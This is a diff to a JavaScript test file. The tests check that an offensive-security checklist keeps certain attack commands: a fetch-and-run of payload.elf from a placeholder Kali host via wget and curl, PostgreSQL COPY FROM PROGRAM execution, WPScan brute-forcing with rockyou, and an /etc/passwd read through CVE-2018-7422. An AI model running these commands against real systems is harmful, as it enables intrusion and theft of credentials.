@@ -137,8 +137,8 @@ test("parses the retained checklist edition with working and explanation parity"
     checklist.sourceDigest,
     "ecec4118a4af2cf2dc8f29b82712febe898620d82e82079be85ef91df4a5a731",
   );
-  assert.equal(checklist.tasks.length, 230);
-  assert.equal(new Set(checklist.tasks.map(({ id }) => id)).size, 230);
+  assert.equal(checklist.tasks.length, 231);
+  assert.equal(new Set(checklist.tasks.map(({ id }) => id)).size, 231);
   assert.deepEqual(
     checklist.modules.slice(0, 5).map(({ id }) => id),
     ["network", "ftp", "smb", "remote_access", "http"],
@@ -150,7 +150,7 @@ test("the provenance manifest pins the exact imported bytes", async () => {
   const manifest = JSON.parse(await readFile(manifestPath, "utf8"));
 
   assert.equal(manifest.edition, "2026-11-21.working.132");
-  assert.equal(manifest.expectedTaskCount, 230);
+  assert.equal(manifest.expectedTaskCount, 231);
   assert.equal(manifest.snapshotSha256, await sha256(sourcePath));
 });
 
@@ -206,6 +206,32 @@ test("the PostgreSQL lane keeps a clear remote-login and server-execution path",
   assert.match(execution.working, /wget -q http:\/\/<KALI_IP>:<HTTP_PORT>\/payload\.elf/);
   assert.match(execution.working, /curl -fsSL http:\/\/<KALI_IP>:<HTTP_PORT>\/payload\.elf/);
   assert.match(execution.working, /COPY pg_temp\."stage_<ID>" FROM PROGRAM '\/tmp\/owb-<ID>\.elf'/);
+});
+
+test("the WordPress lane keeps WPScan enumeration, credential, and Site Editor paths", async () => {
+  const checklist = parseChecklist(await readFile(sourcePath, "utf8"));
+  const cms = checklist.tasks.find(({ id }) => id === "WEB-11");
+  const wordpress = checklist.tasks.find(({ id }) => id === "WEB-28");
+
+  assert.ok(cms);
+  assert.ok(wordpress);
+  assert.match(cms.working, /WordPress goes to \*\*WEB-28\*\*/);
+  for (const expected of [
+    "wpscan --update",
+    "WPSCAN_API_TOKEN",
+    "--enumerate ap,at,u,cb,dbe",
+    "--plugins-detection aggressive",
+    "--themes-detection aggressive",
+    "--usernames '<CONFIRMED_USERNAME>'",
+    "--passwords /usr/share/wordlists/rockyou.txt",
+    "searchsploit -x 44340",
+    "ajax_shortcode_pattern.php",
+    "--data-urlencode 'ajax_path=/etc/passwd'",
+  ]) {
+    assert.ok(wordpress.working.includes(expected), expected);
+  }
+  assert.match(wordpress.working, /CVE-2018-7422/);
+  assert.match(wordpress.working, /pre-foothold file-read check/);
 });
 
 test("the Git index preserves the exact supporting reference bytes", async () => {
@@ -494,9 +520,9 @@ test("generation is deterministic for identical input", async () => {
     const second = await generateSite({ sourcePath, manifestPath, outputRoot });
     const secondDigest = await digestTree(outputRoot);
 
-    assert.equal(first.taskCount, 225);
+    assert.equal(first.taskCount, 226);
     assert.equal(first.moduleCount, 47);
-    assert.equal(first.sourceTaskCount, 230);
+    assert.equal(first.sourceTaskCount, 231);
     assert.equal(first.sourceModuleCount, 48);
     assert.deepEqual(second, first);
     assert.equal(secondDigest, firstDigest);
